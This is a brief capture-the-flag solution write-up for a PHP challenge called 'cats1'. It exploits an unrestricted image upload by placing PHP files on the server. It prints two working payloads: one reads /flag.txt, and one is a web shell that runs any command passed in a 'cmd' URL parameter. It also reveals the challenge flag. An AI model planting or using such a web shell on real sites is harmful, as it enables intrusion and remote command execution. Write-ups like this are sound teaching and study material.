# Solution - cats1 
- This is a PHP site. 
- When uploading pictures, there is no restriction put on the *type* of file that can be added. 
- As a result, we can upload a PHP file with our own code inside of it.
	- Do this on the ``upload.php`` page. 
	- Upload PHP to read and display the flag at ``/flag.txt`` or a reverse shell.
	- The following code will print the flag: 
		- 
		- ```<?php
			echo system("cat /flag.txt", $retval);
			?>```
	- The following code will take in a parameter and execute it: 
		- ```<?php
			echo system($_GET['cmd'], $retval);
			?>```

- Once we execute the code, we can get code execution to read the flag from the server.
	- Reference the file in the main URL. 
	- It will be at something like http://url.com/pictures/attack.php
- Flag: SC4{PhP_1s_A_m0nster_s0_mAny_issues!}